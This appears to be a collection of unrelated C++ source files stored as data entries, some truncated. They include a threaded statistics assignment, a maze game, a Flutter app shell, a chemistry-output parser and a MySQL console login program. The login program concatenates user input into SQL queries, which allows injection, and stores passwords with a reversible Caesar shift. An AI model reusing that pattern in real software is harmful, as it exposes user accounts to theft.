as average-factor. For part 1, you will be using same value for size and double. Use of \n\t//   different values for size and divisor will be useful for multi-threaded implementation in part-2. \n\tvoid computeAvgFactor(const int* arr, int size, int divisor, double& avg) {\n\t\tavg = 0;\n\t\tfor (int i = 0; i < size; i++) {\n\t\t\tavg += arr[i];\n\t\t}\n\t\tavg /= divisor;\n\t}\n\n\t// The following function receives array (pointer) as the first argument, number of array elements  \n\t//   (size) as second argument, divisor as the third argument, computed average value of the data items\n\t//   as fourth argument, and var as fifth argument. Size and divisor are not necessarily same as in the \n\t//   case of computeAvgFactor. When size and divisor hold same value, var will get total variance of \n\t//   the array elements. When they are different, var will hold a value called as variance factor. \n\t//   For part 1, you will be using same value for size and double. Use of different values for size \n\t//   and divisor will be useful for multi-threaded implementation in part-2. \n\tvoid computeVarFactor(const int* arr, int size, int divisor, double avg, double& var) {\n\t\tvar = 0;\n\t\tfor (int i = 0; i < size; i++) {\n\t\t\tvar += (arr[i] - avg) * (arr[i] - avg);\n\t\t}\n\t\tvar /= divisor;\n\t}\n\n\t// The following constructor of the functor receives name of the data file, opens it in \n\t//   binary mode for reading, reads first int data as total_items, allocate memory space \n\t//   to hold the data items, and reads the data items into the allocated memory space. \n\t//   It prints first five data items and the last three data items as data samples. \n\t//   \n\tProcessData::ProcessData(const std::string& filename, int n_threads) {  \n\t\t// TODO: Open the file whose name was received as parameter and read the content\n\t\t//         into variables \"total_items\" and \"data\". Don't forget to allocate\n\t\t//         memory for \"data\".\n\t\t//       The file is binary and has the format described in the specs.\n\n\n        // open the file with binary mode\n        std::ifstream file(filename, std::ios::in | std::ios::binary);\n\n        // check if the file is opened\n        if (file) { \n            // read the first int data as total_items\n            file.read(reinterpret_cast<char*>(&total_items), sizeof(total_items));\n            // allocate memory space to hold the data items\n            data = new int[total_items];\n\n            // read the data items into the allocated memory space\n            for (int i = 0; i < total_items; i++) {\n                file.read(reinterpret_cast<char*>(&data[i]), sizeof(int));\n            }\n        }\n        else {\n            // throw an exception if the file cannot be opened\n            throw std::string(\"Cannot open file\");\n        }\n\n        // close the file\n        file.close();\n\n\t\tstd::cout << \"Item's count in file '\"<< filename << \"': \" << total_items << std::endl;\n\t\tstd::cout << \"  [\" << data[0] << \", \" << data[1] << \", \" << data[2] << \", ... , \"\n\t\t          << data[total_items - 3] << \", \" << data[total_items - 2] << \", \"\n\t\t          << data[total_items - 1] << \"]\" << std::endl;\n\n\t\t// Following statements initialize the variables added for multi-threaded \n\t\t//   computation\n\t\tnum_threads = n_threads; \n\t\taverages = new double[num_threads] {};\n\t\tvariances = new double[num_threads] {};\n\t\tp_indices = new int[num_threads+1] {};\n\t\tfor (int i = 0; i < num_threads; i++)\n\t\t\tp_indices[i] = i * (total_items / num_threads);\n\t\tp_indices[num_threads] = total_items;\n\t}\n\tProcessData::~ProcessData() {\n\t\tdelete[] data;\n\t\tdelete[] averages;\n\t\tdelete[] variances;\n\t\tdelete[] p_indices;\n\t}\n\n\tProcessData::operator bool() const {\n\t\treturn total_items > 0 && data;\n\t}\n\n\t// TODO Improve operator() function from part-1 for multi-threaded operation. Enhance the  \n\t//   function logic for the computation of average and variance by running the \n\t//   function computeAvgFactor and computeVarFactor in multile threads. \n\t// The function divides the data into a number of parts, where the number of parts is \n\t//   equal to the number of threads. Use multi-threading to compute average-factor for \n\t//   each part of the data by calling the fu",
    "\ufeff// labyrinth.cpp : \u5b9a\u4e49\u5e94\u7528\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\u3002\n//\n\n#include \"framework.h\"\n#include \"labyrinth.h\"\n#include <math.h>\n#include <array>\n#include <windows.h>\n#include <algorithm>\n\n#define MAX_LOADSTRING 100\n\n// \u5168\u5c40\u53d8\u91cf:\nHINSTANCE hInst;                                // \u5f53\u524d\u5b9e\u4f8b\nWCHAR szTitle[MAX_LOADSTRING];                  // \u6807\u9898\u680f\u6587\u672c\nWCHAR szWindowClass[MAX_LOADSTRING];            // \u4e3b\u7a97\u53e3\u7c7b\u540d\n\n// \u6b64\u4ee3\u7801\u6a21\u5757\u4e2d\u5305\u542b\u7684\u51fd\u6570\u7684\u524d\u5411\u58f0\u660e:\nATOM                MyRegisterClass(HINSTANCE hInstance);\nBOOL                InitInstance(HINSTANCE, int);\nLRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);\nINT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);\n\nWPARAM downKey = 0;\nWPARAM upKey = 0;\nint playerDir = 0;\ndouble playerAngle = 1;\ndouble speed = 0.5;\n\ndouble playerDeltaX = 0;\ndouble playerDeltaY = cos(playerAngle)*speed;\n\nbool Wkey = false;\nbool Akey = false;\nbool Skey = false;\nbool Dkey = false;\nbool Rkey = false;\n\nint mapSize =7;\nunsigned long time0;\nWCHAR str[20];\nint count = 0;\nunsigned long tolTime = 0;\n\ndouble playerX =10;\ndouble playerY =10;\n\nconst int WINDOW_WIDTH = 1600;\nconst int WINDOW_HEIGHT = 900;\n\nbool win = false;\n\n#define mapWidth 40\n#define mapHeight 40\n\nint worldMap[mapWidth][mapHeight] =\n{\n {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},\n {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},\n {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},\n {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1},\n {1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1},\n {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1},\n {1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1},\n {1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1},\n {1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1},\n {1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1},\n {1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1},\n {1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1},\n {1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1},\n {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1},\n {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1},\n {1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1},\n {1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1},\n {1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1},\n {1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1},\n {1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1},\n {1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1},\n {1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1},\n {1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},\n {1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1},\n {1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},\n {1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},\n {1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},\n {1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1},\n {1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},\n {1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1},\n {1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1},\n {1, 0, 0",
    "#include \"Allocator.h\"\n#include <cstdlib>\n\n/**\n * @class DefaultAllocator\n * @brief A default implementation of the Allocator interface.\n *\n * This class provides a basic allocator that uses std::malloc and std::free\n * functions to allocate and deallocate memory.\n *\n * @note For more advanced memory management, consider implementing a custom allocator.\n */\nclass DefaultAllocator : public Allocator {\n    /**\n     * @brief Allocates a block of memory with the specified size.\n     *\n     * @param size The size of the memory block to allocate.\n     * @return A pointer to the allocated memory block.\n     */\npublic:\n    void* allocate(size_t size) override {\n        return std::malloc(size);\n    }\n\n    /**\n     * @brief Deallocates the memory pointed to by \\p ptr.\n     *\n     * The deallocate method frees the memory block pointed to by the \\p ptr parameter,\n     * which was previously allocated by the allocate method of the Allocator class.\n     *\n     * @param ptr A pointer to the memory block to deallocate.\n     * @return None.\n     */\n    void deallocate(void* ptr) override {\n        std::free(ptr);\n    }\n};\n",
    "// Problem link ----->\n\nhttps://leetcode.com/problems/happy-number/description/\n\n// solutions ------>\n// using Floyd's cycle finding algorithm\nclass Solution {\npublic:\n    \n     int getSquareSum(int n) {\n\n        int currSum = 0;\n\n        while(n != 0) {\n\n            int remainder = (n % 10);\n            currSum += (remainder * remainder);\n            n /= 10;\n        }\n\n        return currSum;\n    }\n    bool isHappy(int n) {\n\n        int slow = getSquareSum(n);\n        int fast = getSquareSum(getSquareSum(n));\n\n        while ((slow != fast) && (fast != 1)) {\n\n              slow = getSquareSum(slow);\n              fast = getSquareSum(getSquareSum(fast));\n        }\n\n        return fast == 1;\n    }\n};\n\n// using hashmap\nclass Solution {\npublic:\n    \n     int getSquareSum(int n) {\n        int currSum = 0;\n\n        while(n != 0) {\n\n            int remainder = (n % 10);\n            currSum += (remainder * remainder);\n            n /= 10;\n        }\n        return currSum;\n    }\n    bool isHappy(int n) {\n\n        unordered_set<int> st;\n\n        while (n != 1 && st.find(n) == st.end()) {\n            st.insert(n);\n            n = getSquareSum(n);\n        }\n        \n        return n == 1;\n    }\n};\n",
    "#include <iostream>\n#include <mysql.h>\n#include <mysqld_error.h>\n#include <windows.h>\nusing namespace std;\n\n\nconst char* HOST = \"localhost\";\nconst char* USER = \"root\";\nconst char* PW = \"your password\"; \nconst char* DB = \"mydb\";\n\nclass Login{\nprivate:\n\tstring userId, userPW;\npublic:\n\tLogin(): userId(\"\"), userPW(\"\") {}\n\t\nvoid setId(string id) {\n    userId = id;\n }\n\n void setPW(string pw) {\n    userPW = pw;\n }\n \n string getId() const {\n    return userId;\n }\n\nstring getPW() const {\n    return userPW;\n }\n \n};\n\nchar encryptCh(char ch, int shift){\nif(isalpha(ch)){\n\tchar base = isupper(ch) ? 'A' : 'a';\n\tchar encrypted_ch =(ch - base + shift + 26) % 26 + base;\nreturn encrypted_ch;\n}\nif(isdigit(ch)){\n    char encrypted_ch = (ch - '0' + shift + 10) % 10 + '0';\n    return encrypted_ch;\t\n}\nreturn ch;\t\n}\n\nstring encrypt(const string& password, int shift){\n\tstring encrypted = \"\";\nfor(int i=0; i<password.length(); i++){\nchar ch = password[i];\nchar encryptedChar = encryptCh(ch,shift);\nencrypted += encryptedChar;\n}\nreturn encrypted;\n}\n\nchar decryptCh(char ch, int shift) {\nif (isalpha(ch)) {\n    char base = isupper(ch) ? 'A' : 'a';\n    char decrypted_ch = (ch - base - shift + 26) % 26 + base;\n    return decrypted_ch;\n} \nelse if (isdigit(ch)) {\n    char decrypted_ch = (ch - '0' - shift + 10) % 10 + '0';\n    return decrypted_ch;\n} \nelse{\n\treturn ch;\n}\t\n}\n\nstring decrypt(const string& encrypted,int shift){\nstring decrypted = \"\";\n for (size_t i = 0; i < encrypted.length(); i++) {\n    char ch = encrypted[i];\n    char decryptedChar = decryptCh(ch, shift);\n    decrypted += decryptedChar;\n }\n return decrypted;\t\n}\n\nstring DBpw(MYSQL* conn, const string& id){\n\tstring encryptedPW;\n\t\nstring get= \"SELECT PW FROM password WHERE Id='\"+id+\"' \";\nif (mysql_query(conn, get.c_str())) {\n    cout << \"Error: \" << mysql_error(conn) << endl;\n}\nelse{\nMYSQL_RES* res;\nres = mysql_store_result(conn);\nif(res){\nMYSQL_ROW\trow = mysql_fetch_row(res);\nif(row){\n\tencryptedPW = row[0];\n}\n}\n}\nreturn encryptedPW;\n}\n\nint main() {\n\tLogin l;\n\n\nMYSQL* conn;\nconn = mysql_init(NULL);\n\nif (!mysql_real_connect(conn, HOST, USER, PW, DB, 3306, NULL, 0)) {\n    cout << \"Error: \" << mysql_error(conn) << endl;\n} \nelse {\n    cout << \"Logged In Database!\" << endl;\n    }\nSleep(3000);\nint shift = 3;\n\nbool exit = false;\nwhile(!exit){\n\tsystem(\"cls\");\ncout << \"1. Signup.\" << endl;\ncout << \"2. Login.\" << endl;\ncout << \"0. Exit.\" << endl;\ncout << \"Enter Your Choice: \";\nint val;\ncin>>val;\n\nif(val==1){\n    system(\"cls\");\n    string id, pw;\ncout << \"Enter ID For Signup: \";\ncin >> id;\nl.setId(id);\ncout << \"Enter A Strong Password: \";\ncin >> pw;\nl.setPW(pw);\n\nstring encryptedPW = encrypt(l.getPW(),shift);\n\nstring Sup= \"INSERT INTO password (Id, PW) VALUES ('\"+l.getId()+\"', '\"+encryptedPW+\"' )\";\nif(mysql_query(conn,Sup.c_str())){\n\tcout<<\"Error: \"<<mysql_error(conn)<<endl;\n}\nelse{\n\tcout<<\"Singup Successfuly\"<<endl;\n}\nSleep(3000);\t\n}// if1\n\nelse if(val==2){\n\tsystem(\"cls\");\nstring id, pw;\ncout << \"Enter ID: \";\ncin >> id;\ncout << \"Enter Your password: \";\ncin >> pw;\n\nstring getDB = DBpw(conn,id);\n\nif(!getDB.empty()){\nstring decryptedPW = decrypt(getDB,shift)\t;\n\nif(decryptedPW == pw){\n\tcout<<\"Welcome\"<<endl;\n}\nelse{\n\tcout<<\"Incorrect Password. Try Again!\"<<endl;\n}\n}\nelse{\n\tcout<<\"User ID not found Try Again!\";\n}\n\nSleep(5000);\n\t\n}//if2\n\nelse if(val==0){\n\texit = true;\n\tcout<<\"Bye!\"<<endl;\n}\nelse{\n\tcout<<\"Invalid Input\"<<endl;\n}\n\n}//while\nreturn 0;\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"finance_trivia\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <sstream>\n#include <filesystem>\n#include <cstdio> // Biblioteca para a fun\u00e7\u00e3o remove\n#include <unordered_map>\n#include <iomanip>\n\n// Estrutura para armazenar as coordenadas\nstruct Coordenada {\n    int centerNumber;\n    int atomicNumber;\n    double x, y, z;\n};\n\n// Estrutura para armazenar as cargas\nstruct Carga {\n    int atomNumber;\n    std::string atomType;\n    double charge;\n};\n\n// Fun\u00e7\u00e3o para importar coordenadas do arquivo\nstd::vector<Coordenada> importarCoordenadas(const std::string& nomeArquivo) {\n    std::ifstream arquivo(nomeArquivo);\n    std::vector<Coordenada> coordenadas;\n\n    // Verificar se o arquivo foi aberto com sucesso\n    if (!arquivo.is_open()) {\n        std::cerr << \"Erro ao abrir o arquivo: \" << nomeArquivo << std::endl;\n        return coordenadas; // Retorna um vetor vazio em caso de erro\n    }\n\n    std::string linha;\n    bool coordenadasIniciadas = false;\n    // Ler o arquivo linha por linha\n    while (std::getline(arquivo, linha)) {\n        if (linha.find(\"                         Standard orientation:                         \") != std::string::npos) {\n            coordenadasIniciadas = true;\n            // Pular a linha de cabe\u00e7alho e a linha de separador\n            std::getline(arquivo, linha);\n            std::getline(arquivo, linha);\n            std::getline(arquivo, linha);\n            std::getline(arquivo, linha);\n            continue;\n        }\n\n        if (coordenadasIniciadas) {\n            if (linha.find(\"-----\") != std::string::npos) {\n                coordenadasIniciadas = false;\n                continue;\n            }\n\n            Coordenada coord;\n            std::istringstream iss(linha);\n            iss >> coord.centerNumber >> coord.atomicNumber >> coord.atomicNumber >> coord.x >> coord.y >> coord.z;\n            coordenadas.push_back(coord);\n        }\n    }\n\n    // Fechar o arquivo\n    arquivo.close();\n\n    return coordenadas; // Retorna o vetor com as coordenadas\n}\n\n\n// Fun\u00e7\u00e3o para importar cargas do arquivo\nstd::vector<Carga> importarCargas(const std::string& nomeArquivo) {\n    std::ifstream arquivo(nomeArquivo);\n    std::vector<Carga> cargas;\n\n    // Verificar se o arquivo foi aberto com sucesso\n    if (!arquivo.is_open()) {\n        std::cerr << \"Erro: \" << nomeArquivo << std::endl;\n        return cargas; // Retorna um vetor vazio em caso de erro\n    }\n\n    std::string linha;\n    bool cargasIniciadas = false;\n    // Ler o arquivo linha por linha\n    while (std::getline(arquivo, linha)) {\n        if (linha.find(\"ESP charges:\") != std::string::npos) {\n            cargasIniciadas = true;\n            // Pular a linha de cabe\u00e7alho\n            std::getline(arquivo, linha);\n            continue;\n        }\n\n        if (cargasIniciadas) {\n            if (linha.find(\"Sum of ESP charges\") != std::string::npos) {\n                cargasIniciadas = false;\n                break;\n            }\n\n            Carga carga;\n            std::istringstream iss(linha);\n            if (iss >> carga.atomNumber >> carga.atomType >> carga.charge) {\n                cargas.push_back(carga);\n            }\n        }\n    }\n\n    // Fechar o arquivo\n    arquivo.close();\n\n    return cargas; // Retorna o vetor com as cargas\n}\n\n// Fun\u00e7\u00e3o para salvar coordenadas em um arquivo\nvoid salvarCoordenadas(const std::vector<Coordenada>& coordenadas, const std::string& nomeArquivo) {\n    std::ofstream arquivo(nomeArquivo);\n\n    // Verificar se o arquivo foi aberto com sucesso\n    if (!arquivo.is_open()) {\n        std::cerr << \"Erro: \" << nomeArquivo << std::endl;\n        return;\n    }\n\n    // Escrever as coordenadas no arquivo\n    for (const auto& coord : coordenadas) {\n        arquivo << coord.centerNumber << \" \" << coord.atomicNumber << \" \" << coord.x << \" \" << coord.y << \" \" << coord.z << std::endl;\n    }\n\n    // Fechar o arquivo\n    arquivo.close();\n}\n\n\n// Fun\u00e7\u00e3o para salvar cargas em um arquivo\nvoid salvarCargas(const std::vector<Carga>& cargas, const std::string& nomeArquivo) {\n    std::ofstream arquivo(nomeArquivo);\n\n    // Verificar se o arquivo foi aberto com sucesso\n    if (!arquivo.is_open()) {\n        std::cerr << \"Erro: \" << nomeArquivo << std::endl;\n        return;\n    }\n\n    // Escrever as cargas no arquivo\n    for (const auto& carga : cargas) {\n        arquivo << carga.atomNumber << \" \" << carga.atomType << \" \" << carga.charge << std::endl;\n    }\n\n    // Fechar o arquivo\n    arquivo.close();\n}\n\nvoid removeFirstColumn(const std::string& inputFile, const std::string& outputFile) {\n    std::ifstream inFile(inputFile);\n    std::ofstream outFile(outputFile);\n\n    if (!inFile.is_open()) {\n        std::cerr << \"Erro.\\n\";\n        return;\n    }\n    if (!outFile.is_open()) {\n        std::cerr << \"Erro.\\n\";\n        return;\n    }\n\n    std::string line;\n    while (std::getline(inFile, line)) {\n        std::istringstream iss(line);\n        std::string token;\n        std::vector<std::string> columns;\n\n        // Ler todas as co",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"client_rcic_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// aryan tripathi\n// i use arch btw \n \n#include <bits/stdc++.h>\n \n#define inf 1e18\n#define pb push_back\n#define popb pop_back\n#define fi first\n#define se second\n#define sll set<long long>\n#define vll vector<long long>\n#define ll long long int\n#define pll pair<long long,long long>\n#define vp vector<pair<long long,long long>>\n#define umpll unordered_map<long long,long long>\n#define mpll map<long long>\n#define maxpq priority_queue<long long>\n#define minpq priority_queue<long long, vector<long long>, greater<long long>>\n#define dq deque<long long>\n#define qu queue<long long>\n#define st stack<long long>\n#define ms multiset<long long>\n#define usll unordered_set<long long>\n \n#define mod 1000000007\n#define clr(a) memset(a, 0, sizeof(a))\n#define sz(x) x.size()\n#define rep(n) for (ll i = 0; i < n; i++)\n#define myfor(i, x, y) for (int i = x; i < y; i++)\n#define mydec(i, x, y) for (int i = x; i >= y; i--)\n#define all(v) v.begin(), v.end()\n#define min3(a, b, c) min(a, min(b, c))\n#define max3(a, b, c) max(a, max(b, c))\n \n#define MOD 998244353\n \nusing namespace std;\n \nvoid solve(){\n\t\n}\n \nint main(){\n    solve();\n}",
    "#include \"metric_sdk_plugin.h\"\n\n// This must be included before many other Windows headers.\n#include <windows.h>\n\n// For getPlatformVersion; remove unless needed for your plugin implementation.\n#include <VersionHelpers.h>\n\n#include <flutter/method_channel.h>\n#include <flutter/plugin_registrar_windows.h>\n#include <flutter/standard_method_codec.h>\n\n#include <memory>\n#include <sstream>\n\nnamespace metric_sdk {\n\n// static\nvoid MetricSdkPlugin::RegisterWithRegistrar(\n    flutter::PluginRegistrarWindows *registrar) {\n  auto channel =\n      std::make_unique<flutter::MethodChannel<flutter::EncodableValue>>(\n          registrar->messenger(), \"metric_sdk\",\n          &flutter::StandardMethodCodec::GetInstance());\n\n  auto plugin = std::make_unique<MetricSdkPlugin>();\n\n  channel->SetMethodCallHandler(\n      [plugin_pointer = plugin.get()](const auto &call, auto result) {\n        plugin_pointer->HandleMethodCall(call, std::move(result));\n      });\n\n  registrar->AddPlugin(std::move(plugin));\n}\n\nMetricSdkPlugin::MetricSdkPlugin() {}\n\nMetricSdkPlugin::~MetricSdkPlugin() {}\n\nvoid MetricSdkPlugin::HandleMethodCall(\n    const flutter::MethodCall<flutter::EncodableValue> &method_call,\n    std::unique_ptr<flutter::MethodResult<flutter::EncodableValue>> result) {\n  if (method_call.method_name().compare(\"getPlatformVersion\") == 0) {\n    std::ostringstream version_stream;\n    version_stream << \"Windows \";\n    if (IsWindows10OrGreater()) {\n      version_stream << \"10+\";\n    } else if (IsWindows8OrGreater()) {\n      version_stream << \"8\";\n    } else if (IsWindows7OrGreater()) {\n      version_stream << \"7\";\n    }\n    result->Success(flutter::EncodableValue(version_stream.str()));\n  } else {\n    result->NotImplemented();\n  }\n}\n\n}  // namespace metric_sdk\n",
    "#include \"Complaint.h\"\n#include \"Department.h\"\n#include \"Teacher.h\"\n\nstring Dept_Tostring(DepartmentNames s);\nstring StateTostring(Status s);\n\nComplaint::Complaint(std::string des, Teacher* t, Department* d, std::string status, int id)\n    : description(des), teacher(t), department(d) {\n    if (status == \"Resolved\") {\n        state = RESOLVED;\n    }\n    else if (status == \"Assigned\") {\n        state = ASSIGNED;\n    }\n    else if (status == \"New\") {\n        state = NEW;\n    }\n    this->CID = id;\n}\n\nvoid Complaint::C_setter(std::string des) {\n    description = des;\n}\n\nvoid Complaint::Complain_print() {\n    \n    cout << \"Complaint ID: \" << CID << endl;\n    cout << \"Status: \" << StateTostring(state) << endl;\n    std::cout << \"Description: \" << description << std::endl;\n    std::cout << \"Initiated By: \" << teacher->getID() << std::endl; \n    cout << \"Belongs to Department: \" << Dept_Tostring(department->getDept()) << endl;\n    cout << \"Complaint Filed Date: \";\n    